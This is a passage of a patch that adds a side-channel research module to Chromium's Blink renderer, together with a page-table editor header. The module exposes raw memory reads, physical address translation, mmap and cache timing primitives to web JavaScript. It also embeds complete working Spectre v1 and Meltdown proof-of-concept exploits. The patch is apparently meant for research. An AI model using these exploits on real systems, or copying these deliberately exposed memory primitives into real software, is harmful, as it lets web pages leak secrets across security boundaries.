++  DeviceIoControl(ptedit_fd, PTEDITOR_FLUSH_TLB, (LPVOID)&vaddr, sizeof(vaddr),
++                  (LPVOID)&vaddr, sizeof(vaddr), &returnLength, 0);
++#endif
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] ptedit_fnc int ptedit_switch_tlb_invalidation(
++    int implementation) {
++#if defined(LINUX)
++  return (int)ioctl(ptedit_fd, PTEDITOR_IOCTL_CMD_SWITCH_TLB_INVALIDATION,
++                    (size_t)implementation);
++#else
++  NO_WINDOWS_SUPPORT
++  return -1;
++#endif
++}
++
++// ---------------------------------------------------------------------------
++ptedit_fnc size_t ptedit_get_mts() {
++  size_t mt = 0;
++#if defined(LINUX)
++  ioctl(ptedit_fd, PTEDITOR_IOCTL_CMD_GET_PAT, (size_t)&mt);
++#else
++  DWORD returnLength;
++  DeviceIoControl(ptedit_fd, PTEDITOR_GET_PAT, (LPVOID)&mt, sizeof(mt),
++                  (LPVOID)&mt, sizeof(mt), &returnLength, 0);
++#endif
++  return mt;
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] ptedit_fnc char ptedit_get_mt(unsigned char mt) {
++  size_t mts = ptedit_get_mts();
++#if defined(__i386__) || defined(__x86_64__) || defined(_WIN64)
++  return ((mts >> (mt * 8)) & 7);
++#elif defined(__aarch64__)
++  return ((mts >> (mt * 8)) & 0xff);
++#endif
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] ptedit_fnc const char* ptedit_mt_to_string(unsigned char mt) {
++#if defined(__i386__) || defined(__x86_64__) || defined(_WIN64)
++  const char* mts[] = {"UC", "WC", "Rsvd", "Rsvd", "WT",
++                       "WP", "WB", "UC-",  "Rsvd"};
++  if (mt <= 7)
++    return mts[mt];
++  return NULL;
++#elif defined(__aarch64__)
++  static char mts[16];
++  int i;
++  mts[0] = 0;
++  for (i = 0; i < 2; i++) {
++    strcat(mts, i == 0 ? "I" : "O");
++    if ((mt & 0xf) == ((mt >> 4) & 0xf))
++      strcpy(mts, "");
++    switch ((mt >> (i * 4)) & 0xf) {
++      case 0:
++        strcat(mts, "DM");
++        break;
++      case 1: /* Fall through */
++      case 2: /* Fall through */
++      case 3:
++        strcat(mts, "WT");
++        break;
++      case 4:
++        strcat(mts, "UC");
++        break;
++      case 5: /* Fall through */
++      case 6: /* Fall through */
++      case 7:
++        strcat(mts, "WB");
++        break;
++      case 8:  /* Fall through */
++      case 9:  /* Fall through */
++      case 10: /* Fall through */
++      case 11:
++        strcat(mts, "WT");
++        break;
++      case 12: /* Fall through */
++      case 13: /* Fall through */
++      case 14: /* Fall through */
++      case 15:
++        strcat(mts, "WB");
++    }
++  }
++  return mts;
++#endif
++}
++
++// ---------------------------------------------------------------------------
++ptedit_fnc void ptedit_set_mts(size_t mts) {
++#if defined(LINUX)
++  ioctl(ptedit_fd, PTEDITOR_IOCTL_CMD_SET_PAT, mts);
++#else
++  DWORD returnLength;
++  DeviceIoControl(ptedit_fd, PTEDITOR_GET_PAT, (LPVOID)&mts, sizeof(mts),
++                  (LPVOID)&mts, sizeof(mts), &returnLength, 0);
++#endif
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] ptedit_fnc void ptedit_set_mt(unsigned char mt,
++                                               unsigned char value) {
++  size_t mts = ptedit_get_mts();
++#if defined(__i386__) || defined(__x86_64__) || defined(_WIN64)
++  mts &= ~(7 << (mt * 8));
++#elif defined(__aarch64__)
++  mts &= ~(0xff << (mt * 8));
++#endif
++  mts |= ((size_t)value << (mt * 8));
++  ptedit_set_mts(mts);
++}
++
++// ---------------------------------------------------------------------------
++ptedit_fnc unsigned char ptedit_find_mt(unsigned char type) {
++  size_t mts = ptedit_get_mts();
++  unsigned char found = 0;
++  int i;
++  for (i = 0; i < 8; i++) {
++#if defined(__i386__) || defined(__x86_64__) || defined(_WIN64)
++    if (((mts >> (i * 8)) & 7) == type)
++      found |= (1 << i);
++#elif defined(__aarch64__)
++    if (((mts >> (i * 8)) & 0xff) == type) {
++      found |= (1 << i);
++    } else {
++      unsigned char plow, phigh;
++      plow = (mts >> (i * 8)) & 0xf;
++      phigh = ((mts >> (i * 8)) >> 4) & 0xf;
++      if ((plow == phigh) && (plow == type)) {
++        found |= (1 << i);
++      }
++    }
++#endif
++  }
++  return found;
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] ptedit_fnc int ptedit_find_first_mt(unsigned char type) {
++#if defined(LINUX)
++  return __builtin_ffs(ptedit_find_mt(type)) - 1;
++#else
++  DWORD index = 0;
++  if (BitScanForward64(&index, ptedit_find_mt(type))) {
++    return index;
++  } else {
++    return -1;
++  }
++#endif
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] ptedit_fnc size_t ptedit_apply_mt(size_t entry,
++                                                   unsigned char mt) {
++#if defined(__i386__) || defined(__x86_64__) || defined(_WIN64)
++  entry &= ~((1ull << PTEDIT_PAGE_BIT_PWT) | (1ull << PTEDIT_PAGE_BIT_PCD) |
++             (1ull << PTEDIT_PAGE_BIT_PAT));
++  if (mt & 1)
++    entry |= (1ull << PTEDIT_PAGE_BIT_PWT);
++  if (mt & 2)
++    entry |= (1ull << PTEDIT_PAGE_BIT_PCD);
++  if (mt & 4)
++    entry |= (1ull << PTEDIT_PAGE_BIT_PAT);
++#elif defined(__aarch64__)
++  entry &= ~0x1c;
++  entry |= (mt & 7) << 2;
++#endif
++  return entry;
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] ptedit_fnc unsigned char ptedit_extract_mt(size_t entry) {
++#if defined(__i386__) || defined(__x86_64__) || defined(_WIN64)
++  return (!!(entry & (1ull << PTEDIT_PAGE_BIT_PWT))) |
++         ((!!(entry & (1ull << PTEDIT_PAGE_BIT_PCD))) << 1) |
++         ((!!(entry & (1ull << PTEDIT_PAGE_BIT_PAT))) << 2);
++#elif defined(__aarch64__)
++  return (entry >> 2) & 7;
++#endif
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] ptedit_fnc void ptedit_full_serializing_barrier() {
++#if defined(__i386__) || defined(__x86_64__) || defined(_WIN64)
++#if defined(LINUX)
++  asm volatile("mfence\nlfence\n" ::: "memory");
++#else
++  MemoryBarrier();
++#endif
++#elif defined(__aarch64__)
++  asm volatile("DSB SY");
++  asm volatile("DSB ISH");
++  asm volatile("ISB");
++#endif
++  ptedit_set_paging_root(0, ptedit_get_paging_root(0));
++#if defined(__i386__) || defined(__x86_64__) || defined(_WIN64)
++#if defined(LINUX)
++  asm volatile("mfence\nlfence\n" ::: "memory");
++#else
++  MemoryBarrier();
++#endif
++#elif defined(__aarch64__)
++  asm volatile("ISB");
++  asm volatile("DSB ISH");
++  asm volatile("DSB SY");
++#endif
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] ptedit_fnc void ptedit_pte_set_bit(void* address,
++                                                    pid_t pid,
++                                                    int bit) {
++  ptedit_entry_t vm = ptedit_resolve(address, pid);
++  if (!(vm.valid & PTEDIT_VALID_MASK_PTE))
++    return;
++  vm.pte |= (1ull << bit);
++  vm.valid = PTEDIT_VALID_MASK_PTE;
++  ptedit_update(address, pid, &vm);
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] ptedit_fnc void ptedit_pte_clear_bit(void* address,
++                                                      pid_t pid,
++                                                      int bit) {
++  ptedit_entry_t vm = ptedit_resolve(address, pid);
++  if (!(vm.valid & PTEDIT_VALID_MASK_PTE))
++    return;
++  vm.pte &= ~(1ull << bit);
++  vm.valid = PTEDIT_VALID_MASK_PTE;
++  ptedit_update(address, pid, &vm);
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] ptedit_fnc unsigned char ptedit_pte_get_bit(void* address,
++                                                             pid_t pid,
++                                                             int bit) {
++  ptedit_entry_t vm = ptedit_resolve(address, pid);
++  return !!(vm.pte & (1ull << bit));
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] ptedit_fnc size_t ptedit_pte_get_pfn(void* address,
++                                                      pid_t pid) {
++  ptedit_entry_t vm = ptedit_resolve(address, pid);
++  if (!(vm.valid & PTEDIT_VALID_MASK_PTE))
++    return 0;
++  else
++    return ptedit_get_pfn(vm.pte);
++}
++
++// ---------------------------------------------------------------------------
++[[maybe_unused]] ptedit_fnc void ptedit_pte_set_pfn(void* address,
++                                                    pid_t pid,
++                                                    size_t pfn) {
++  ptedit_entry_t vm = ptedit_resolve(address, pid);
++  if (!(vm.valid & PTEDIT_VALID_MASK_PTE))
++    return;
++  vm.pte = ptedit_set_pfn(vm.pte, pfn);
++  vm.valid = PTEDIT_VALID_MASK_PTE;
++  ptedit_update(address, pid, &vm);
++}
+diff --git a/third_party/blink/renderer/modules/sca/sca.cc b/third_party/blink/renderer/modules/sca/sca.cc
+new file mode 100644
+index 0000000000..8f125f2783
+--- /dev/null
++++ b/third_party/blink/renderer/modules/sca/sca.cc
+@@ -0,0 +1,467 @@
++/**
++ * @file sca.cc
++ * @author Jonathan Busch (jonathan.busch@pm.me)
++ * @brief Implementation of sca.h.
++ * @version 0.1
++ * @date 2022-01-21
++ *
++ * @copyright Copyright (c) 2022
++ *
++ */
++#include "third_party/blink/renderer/modules/sca/sca.h"
++#include "third_party/blink/renderer/core/typed_arrays/dom_array_buffer.h"
++#include "third_party/blink/renderer/platform/wtf/text/wtf_string.h"
++
++#include "ptedit_header.h"
++#include "third_party/blink/renderer/modules/sca/libkdump.h"
++
++#ifdef __linux__
++#include <sys/mman.h>
++#endif
++
++#ifdef _MSC_VER
++#include <intrin.h> /* for rdtscp and clflush */
++#pragma optimize("gt", on)
++#else
++#include <x86intrin.h> /* for rdtscp and clflush */
++#endif
++
++namespace blink {
++
++unsigned long long Sca::bufferAddress(DOMArrayBuffer* buffer) const {
++  return (unsigned long long)(buffer->Data());
++}
++
++DOMHighResTimeStamp Sca::rdtsc() const {
++  return (DOMHighResTimeStamp)libkdump_rdtsc();
++}
++
++void Sca::maccess(unsigned long long addr) const {
++  void* p = (void*)addr;
++  libkdump_maccess(p);
++}
++
++void Sca::flush(unsigned long long addr) const {
++  void* p = (void*)addr;
++  libkdump_flush(p);
++}
++
++unsigned long Sca::getByteAtAddress(unsigned long long address) const {
++  return (unsigned long)*((char*)address);
++}
++
++unsigned long long Sca::getPhysicalAddress(unsigned long long vaddr) {
++  size_t phys = 0;
++
++// If running on linux with root privileges, this method is preferred since it
++// doesn't require the PTEditor kernel module to be installed.
++#ifdef __linux__
++  int fd = open("/proc/self/pagemap", O_RDONLY);
++  uint64_t virtual_addr = (uint64_t)vaddr;
++  size_t value = 0;
++  off_t offset = (virtual_addr / 4096) * sizeof(value);
++  int got = (int)pread(fd, &value, sizeof(value), offset);
++  if (got == sizeof(value)) {
++    phys = (unsigned long long)(value << 12) | ((size_t)vaddr & 0xFFFULL);
++  }
++  close(fd);
++
++  if (phys >= 4096) {
++    return phys;
++  }
++#endif
++
++  // Using the PTEditor kernel module. See https://github.com/misc0110/PTEditor
++  if (ptedit_init() != 0) {
++    return 0;
++  }
++
++  unsigned long target = 'X';
++
++  ptedit_entry_t entry = ptedit_resolve(&target, 0);
++
++  int is_normal_page = -1;
++#if defined(__i386__) || defined(__x86_64__)
++  is_normal_page = !(entry.pd & (1ull << PTEDIT_PAGE_BIT_PSE));
++#elif defined(__aarch64__)
++  is_normal_page = 1;
++#endif
++
++  if (is_normal_page < 0) {
++    return 0;
++  }
++
++  if (is_normal_page) {
++    ptedit_print_entry(entry.pte);
++    phys = (ptedit_get_pfn(entry.pte) << 12) | (((size_t)&target) & 0xfff);
++  } else {
++    ptedit_print_entry(entry.pd);
++    phys = (ptedit_get_pfn(entry.pd) << 21) | (((size_t)&target) & 0x1fffff);
++  }
++
++  ptedit_cleanup();
++
++  return phys;
++}
++
++// Linux only
++unsigned long long Sca::memmap(unsigned long long addr,
++                               unsigned long length,
++                               long prot,
++                               long flags,
++                               long fd,
++                               unsigned long offset) {
++#ifdef __linux__
++  void* p = (void*)addr;
++  long long res =
++      (long long) mmap(p, (size_t)length, (int)prot, (int)flags, (int)fd, (off_t)offset);
++  if (res < 0) {
++    return 0;
++  }
++  return (unsigned long long)res;
++#else
++  return 0;
++#endif
++}
++
++// Linux only
++long Sca::memunmap(unsigned long long addr, unsigned long length) {
++#ifdef __linux__
++  void* p = (void*)addr;
++  return (long)munmap(p, (size_t)length);
++#else
++  return -1;
++#endif
++}
++
++unsigned long Sca::detectThreshold() const {
++  size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
++  size_t dummy[16];
++  size_t* ptr = dummy + 8;
++  uint64_t start = 0, end = 0;
++
++  libkdump_maccess(ptr);
++  for (i = 0; i < count; i++) {
++    start = libkdump_rdtsc();
++    libkdump_maccess(ptr);
++    end = libkdump_rdtsc();
++    reload_time += (end - start);
++  }
++  for (i = 0; i < count; i++) {
++    start = libkdump_rdtsc();
++    libkdump_maccess(ptr);
++    end = libkdump_rdtsc();
++    libkdump_flush(ptr);
++    flush_reload_time += (end - start);
++  }
++  reload_time /= count;
++  flush_reload_time /= count;
++
++  return (unsigned long)(flush_reload_time + reload_time * 2) / 3;
++}
++
++unsigned long long Sca::reload(unsigned long long address) const {
++  size_t time = libkdump_rdtsc();
++  maccess(address);
++  size_t delta = libkdump_rdtsc() - time;
++  return delta;
++}
++
++unsigned long long Sca::flushandreload(unsigned long long address) const {
++  size_t time = libkdump_rdtsc();
++  maccess(address);
++  size_t delta = libkdump_rdtsc() - time;
++  flush(address);
++  return delta;
++}
++
++unsigned long long Sca::flushdelta(unsigned long long address) const {
++  size_t time = libkdump_rdtsc();
++  flush(address);
++  size_t delta = libkdump_rdtsc() - time;
++  return delta;
++}
++
++String Sca::spectre() {
++  return spectre(secret_default);
++}
++
++String Sca::spectre(String sec) {
++  char* secret = (char*)sec.Bytes();
++  size_t malicious_x =
++      (size_t)(secret - (char*)array1); /* default for malicious_x */
++  int i, score[2];
++  int len = sec.length();
++  uint8_t value[2];
++
++  for (i = 0; i < 256 * 512; i++) {
++    array2[i] = unsigned(
++        1); /* write to array2 so in RAM not copy-on-write zero pages */
++  }
++  for (i = 0; i < 64; i++) {
++    unused1[i] =
++        unsigned(1); /* write something so that compiler doesn't complain */
++  }
++  for (i = 0; i < 64; i++) {
++    unused2[i] =
++        unsigned(1); /* write something so that compiler doesn't complain */
++  }
++  String res = String("");
++  while (--len >= 0) {
++    readMemoryByte(malicious_x++, value, score);
++    res = res + (char)value[0];
++    printf("0x%02X='%c' score=%d    ", value[0],
++           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
++  }
++  return res;
++}
++
++/** Meltdown **/
++const char* meltdown_strings[] = {
++    "If you can read this, at least the auto configuration is working",
++    "Generating witty test message...",
++    "Go ahead with the real exploit if you dare",
++    "Have a good day.",
++    "Welcome to the wonderful world of microarchitectural attacks",
++    "Pay no attention to the content of this string",
++    "Please wait while we steal your secrets...",
++    "Would you like fries with that?",
++    "(insert random quote here)",
++    "Don't panic...",
++    "Wait, do you smell something burning?",
++    "How did you get here?"};
++
++String Sca::meltdown() {
++  libkdump_config_t config;
++  config = libkdump_get_autoconfig();
++  libkdump_init(config);
++
++  srand(static_cast<unsigned int>(time(nullptr)));
++  const char* test = meltdown_strings[rand() % (sizeof(meltdown_strings) /
++                                                sizeof(meltdown_strings[0]))];
++  size_t index = 0;
++
++  String res = String("Expect: " + String(test) + "\nGot: ");
++  while (index < strlen(test)) {
++    int value = libkdump_read((size_t)(test + index));
++    res = res + char(value);
++    fflush(stdout);
++    index++;
++  }
++
++  libkdump_cleanup();
++
++  return res;
++}
++
++// PROT Flags
++unsigned long Sca::PROTEXEC() const {
++#ifdef __linux__
++  return PROT_EXEC;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::PROTREAD() const {
++#ifdef __linux__
++  return PROT_READ;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::PROTWRITE() const {
++#ifdef __linux__
++  return PROT_WRITE;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::PROTNONE() const {
++#ifdef __linux__
++  return PROT_NONE;
++#else
++  return 0;
++#endif
++}
++
++// MAP Flags
++unsigned long Sca::MAPSHARED() const {
++#ifdef __linux__
++  return MAP_SHARED;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::MAPSHAREDVALIDATE() const {
++#ifdef __linux__
++  return MAP_SHARED_VALIDATE;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::MAPPRIVATE() const {
++#ifdef __linux__
++  return MAP_PRIVATE;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::MAP32BIT() const {
++#ifdef __linux__
++  return MAP_32BIT;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::MAPANON() const {
++#ifdef __linux__
++  return MAP_ANON;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::MAPANONYMOUS() const {
++#ifdef __linux__
++  return MAP_ANONYMOUS;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::MAPDENYWRITE() const {
++#ifdef __linux__
++  return MAP_DENYWRITE;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::MAPEXECUTABLE() const {
++#ifdef __linux__
++  return MAP_EXECUTABLE;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::MAPFILE() const {
++#ifdef __linux__
++  return MAP_FILE;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::MAPFIXED() const {
++#ifdef __linux__
++  return MAP_FIXED;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::MAPFIXEDNOREPLACE() const {
++#ifdef __linux__
++  return MAP_FIXED_NOREPLACE;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::MAPGROWSDOWN() const {
++#ifdef __linux__
++  return MAP_GROWSDOWN;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::MAPHUGETLB() const {
++#ifdef __linux__
++  return MAP_HUGETLB;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::MAPHUGEMASK() const {
++#ifdef __linux__
++  return MAP_HUGE_MASK;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::MAPHUGESHIFT() const {
++#ifdef __linux__
++  return MAP_HUGE_SHIFT;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::MAPLOCKED() const {
++#ifdef __linux__
++  return MAP_LOCKED;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::MAPNOBLOCK() const {
++#ifdef __linux__
++  return MAP_NONBLOCK;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::MAPNORESERVE() const {
++#ifdef __linux__
++  return MAP_NORESERVE;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::MAPPOPULATE() const {
++#ifdef __linux__
++  return MAP_POPULATE;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::MAPSTACK() const {
++#ifdef __linux__
++  return MAP_STACK;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::MAPSYNC() const {
++#ifdef __linux__
++  return MAP_SYNC;
++#else
++  return 0;
++#endif
++}
++
++unsigned long Sca::MAPTYPE() const {
++#ifdef __linux__
++  return MAP_TYPE;
++#else
++  return 0;
++#endif
++}
++
++}  // namespace blink
+diff --git a/third_party/blink/renderer/modules/sca/sca.h b/third_party/blink/renderer/modules/sca/sca.h
+new file mode 100644
+index 0000000000..678e2fc81f
+--- /dev/null
++++ b/third_party/blink/renderer/modules/sca/sca.h
+@@ -0,0 +1,285 @@
++/**
++ * @file sca.h
++ * @author Jonathan Busch (jonathan.busch@pm.me)
++ * @brief Various low-level functions and code snippets for side-channel
++ * research.
++ * @version 0.1
++ * @date 2022-01-21
++ *
++ * @copyright Copyright (c) 2022
++ *
++ */
++#ifndef THIRD_PARTY_BLINK_RENDERER_MODULES_SCA_SCA_H_
++#define THIRD_PARTY_BLINK_RENDERER_MODULES_SCA_SCA_H_
++
++#include "third_party/blink/renderer/core/dom/dom_high_res_time_stamp.h"
++#include "third_party/blink/renderer/core/typed_arrays/dom_array_buffer.h"
++#include "third_party/blink/renderer/platform/bindings/script_wrappable.h"
++#include "third_party/blink/renderer/platform/wtf/text/wtf_string.h"
++
++#ifdef _MSC_VER
++#include <intrin.h> /* for rdtscp and clflush */
++#pragma optimize("gt", on)
++#else
++#include <x86intrin.h> /* for rdtscp and clflush */
++#endif
++
++#ifdef __linux__
++#include <sys/mman.h>
++#endif
++
++namespace blink {
++
++class Sca final : public ScriptWrappable {
++  DEFINE_WRAPPERTYPEINFO();
++
++ public:
++  static Sca* Create() { return MakeGarbageCollected<Sca>(); }
++
++  Sca() = default;
++
++  /**
++   * @brief Returns the virtual memory address of a given DOMArrayBuffer.
++   *
++   * @param buffer A DOMArrayBuffer object.
++   * @return unsigned long long The virtual memory address of the given buffer.
++   */
++  unsigned long long bufferAddress(DOMArrayBuffer* buffer) const;
++
++  DOMHighResTimeStamp rdtsc() const;
++
++  void maccess(unsigned long long addr) const;
++
++  void flush(unsigned long long addr) const;
++
++  /**
++   * @brief Get the byte in memory of a given virtual address.
++   *
++   * @param address Virtual memory address.
++   * @return unsigned long Unsigned byte at given address.
++   */
++  unsigned long getByteAtAddress(unsigned long long address) const;
++
++  /**
++   * Maps the given virtual address to a physical address.
++   * If on linux root privileges are available, this function tries to read from
++   * /proc/self/pagemap. Else, it will try to use the PTEditor kernel module
++   * from https://github.com/misc0110/PTEditor.
++   *
++   * @param vaddr The virtual memory address to be mapped.
++   * @return unsigned long long If the mapping was successful, returns the
++   * physical address, else 0.
++   */
++  unsigned long long getPhysicalAddress(unsigned long long vaddr);
++
++  /**
++   * @brief Will call mmap() with the provided arguments. (Linux only)
++   * Params equal the ones provided here:
++   * https://man7.org/linux/man-pages/man2/mmap.2.html
++   * @return On success, returns the address of the mapped area. If not on Linux
++   * or on failure, returns 0.
++   */
++  unsigned long long memmap(unsigned long long addr,
++                            unsigned long length,
++                            long prot,
++                            long flags,
++                            long fd,
++                            unsigned long offset);
++  /**
++   * @brief Will call mmap() with the provided arguments. (Linux only)
++   * Params equal the ones provided here:
++   * https://man7.org/linux/man-pages/man2/mmap.2.html
++   *
++   * @return On success, returns 0. On failure, returns -1. If not on Linux,
++   * returns -2;
++   */
++  long memunmap(unsigned long long addr, unsigned long length);
++
++  /**
++   * @brief Calculates the threshold between cache hits and cache misses like
++   * this: (average_hit_time + average_miss_time * 2) / 3
++   *
++   * @return The calculated threshold.
++   */
++  unsigned long detectThreshold() const;
++
++  /**
++   * @brief Measures the time it takes to access the given memory address.
++   *
++   * @param address Virtual address to be measured.
++   * @return Time it took to access the address using rdtsc().
++   */
++  unsigned long long reload(unsigned long long address) const;
++
++  /**
++   * @brief Measures the time it takes to access the given memory address
++   * and then flushes it from the cache.
++   *
++   * @param address Virtual address to be measured and then flushed.
++   * @return Time it took to access the address using rdtsc().
++   */
++  unsigned long long flushandreload(unsigned long long address) const;
++
++  /**
++   * @brief Measures the time it takes to flush the given memory address from
++   * the cache.
++   *
++   * @param address Virtual address to be measured.
++   * @return Time it took to flush the address using rdtsc().
++   */
++  unsigned long long flushdelta(unsigned long long address) const;
++
++  /**
++   * @brief The full Spectre v1 PoC as provided in
++   * https://spectreattack.com/spectre.pdf.
++   *
++   * @return The string "The Magic Words are Squeamish Ossifrage." if
++   * successful.
++   */
++  String spectre();
++
++  /**
++   * @brief The full Spectre v1 PoC as provided in
++   * https://spectreattack.com/spectre.pdf.
++   *
++   * @param sec String that should be leaked using the Spectre attack.
++   * @return The string that was provided as param, if successful.
++   */
++  String spectre(String sec);
++
++  /**
++   * @brief Meltdown PoC as provided in https://github.com/IAIK/meltdown.
++   *
++   * @return The expected result string (randomly chosen from meltdown_strings)
++   * and the actual result of the Meltdown attack.
++   */
++  String meltdown();
++
++  /**
++   * Flags
++   */
++  // PROT
++  unsigned long PROTEXEC() const;
++  unsigned long PROTREAD() const;
++  unsigned long PROTWRITE() const;
++  unsigned long PROTNONE() const;
++
++  // MAP
++  unsigned long MAPSHARED() const;
++  unsigned long MAPSHAREDVALIDATE() const;
++  unsigned long MAPPRIVATE() const;
++  unsigned long MAP32BIT() const;
++  unsigned long MAPANON() const;
++  unsigned long MAPANONYMOUS() const;
++  unsigned long MAPDENYWRITE() const;
++  unsigned long MAPEXECUTABLE() const;
++  unsigned long MAPFILE() const;
++  unsigned long MAPFIXED() const;
++  unsigned long MAPFIXEDNOREPLACE() const;
++  unsigned long MAPGROWSDOWN() const;
++  unsigned long MAPHUGETLB() const;
++  unsigned long MAPHUGEMASK() const;
++  unsigned long MAPHUGESHIFT() const;
++  unsigned long MAPLOCKED() const;
++  unsigned long MAPNOBLOCK() const;
++  unsigned long MAPNORESERVE() const;
++  unsigned long MAPPOPULATE() const;
++  unsigned long MAPSTACK() const;
++  unsigned long MAPSYNC() const;
++  unsigned long MAPTYPE() const;
++
++ private:
++  /*****************************************************************
++   * Spectre full PoC
++   *****************************************************************/
++  // Victim code
++  unsigned int array1_size = 16;
++  uint8_t unused1[64];
++  uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
++  uint8_t unused2[64];
++  uint8_t array2[256 * 512];
++
++  const String secret_default = "The Magic Words are Squeamish Ossifrage.";
++
++  uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */
++
++  void victim_function(size_t x) {
++    if (x < array1_size) {
++      temp &= array2[array1[x] * 512];
++    }
++  }
++
++#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */
++
++  /* Report best guess in value[0] and runner-up in value[1] */
++  void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
++    static int results[256];
++    int tries, i, j, k, mix_i;
++    unsigned int junk = 0;
++    size_t training_x, x;
++    uint64_t time1, time2;
++    volatile uint8_t* addr;
++
++    for (i = 0; i < 256; i++)
++      results[i] = 0;
++    for (tries = 999; tries > 0; tries--) {
++      /* Flush array2[256*(0..255)] from cache */
++      for (i = 0; i < 256; i++)
++        _mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
++
++      /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x)
++       */
++      training_x = tries % array1_size;
++      for (j = 29; j >= 0; j--) {
++        _mm_clflush(&array1_size);
++        for (volatile int z = 0; z < 100; z++) {
++        } /* Delay (can also mfence) */
++
++        /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0
++         */
++        /* Avoid jumps in case those tip off the branch predictor */
++        x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
++        x = (x | (x >> 16));         /* Set x=-1 if j&6=0, else x=0 */
++        x = training_x ^ (x & (malicious_x ^ training_x));
++
++        /* Call the victim! */
++        victim_function(x);
++      }
++
++      /* Time reads. Order is lightly mixed up to prevent stride prediction */
++      for (i = 0; i < 256; i++) {
++        mix_i = ((i * 167) + 13) & 255;
++        addr = &array2[mix_i * 512];
++        time1 = __rdtscp(&junk);         /* READ TIMER */
++        junk = *addr;                    /* MEMORY ACCESS TO TIME */
++        time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
++        if (time2 <= CACHE_HIT_THRESHOLD &&
++            mix_i != array1[tries % array1_size])
++          results[mix_i]++; /* cache hit - add +1 to score for this value */
++      }
++
++      /* Locate highest & second-highest results results tallies in j/k */
++      j = k = -1;
++      for (i = 0; i < 256; i++) {
++        if (j < 0 || results[i] >= results[j]) {
++          k = j;
++          j = i;
++        } else if (k < 0 || results[i] >= results[k]) {
++          k = i;
++        }
++      }
++      if (results[j] >= (2 * results[k] + 5) ||
++          (results[j] == 2 && results[k] == 0))
++        break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
++    }
++    results[0] ^= junk; /* use junk so code above won't get optimized out*/
++    value[0] = (uint8_t)j;
++    score[0] = results[j];
++    value[1] = (uint8_t)k;
++    score[1] = results[k];
++  }
++};
++
++}  // namespace blink
++
++#endif  // THIRD_PARTY_BLINK_RENDERER_MODULES_SCA_SCA_H_
+diff --git a/third_party/blink/renderer/modules/sca/sca.idl b/third_party/blink/renderer/modules/sca/sca.idl
+new file mode 100644
+index 0000000000..d342af4999
+--- /dev/null
++++ b/third_party/blink/renderer/modules/sca/sca.idl
+@@ -0,0 +1,60 @@
++// Author: Jonathan Busch (jonathan.busch@pm.me), 2022
++
++[Exposed = (Window, Worker)] interface Sca {
++  // Low-level functions
++  [Affects = Nothing] unsigned long long bufferAddress(ArrayBuffer buffer);
++  [Affects = Nothing] DOMHighResTimeStamp rdtsc();
++  [Affects = Nothing] void maccess(unsigned long long addr);
++  [Affects = Nothing] void flush(unsigned long long addr);
++  [Affects = Nothing] unsigned long getByteAtAddress(
++      unsigned long long address);
++  [Affects = Nothing] unsigned long long getPhysicalAddress(unsigned long long vaddr);
++  // Linux only
++  [Affects = Nothing] unsigned long long memmap(unsigned long long addr, unsigned long length,
++                                         long prot, long flags, long fd,
++                                         unsigned long offset);
++  [Affects = Nothing] long memunmap(unsigned long long addr, unsigned long length);
++
++  // Code snippets
++  [Affects = Nothing] unsigned long detectThreshold();
++  [Affects = Nothing] unsigned long long reload(unsigned long long address);
++  [Affects = Nothing] unsigned long long flushandreload(
++      unsigned long long address);
++  [Affects = Nothing] unsigned long long flushdelta(unsigned long long address);
++
++  // Spectre full PoC
++  [Affects = Nothing] DOMString spectre();
++  [Affects = Nothing] DOMString spectre(DOMString secret);
++
++  // Meltdown full PoC
++  [Affects = Nothing] DOMString meltdown();
++
++  // Flags PROT
++  readonly attribute unsigned long PROTEXEC;
++  readonly attribute unsigned long PROTREAD;
++  readonly attribute unsigned long PROTWRITE;
++  readonly attribute unsigned long PROTNONE;
++  // Flags MAP
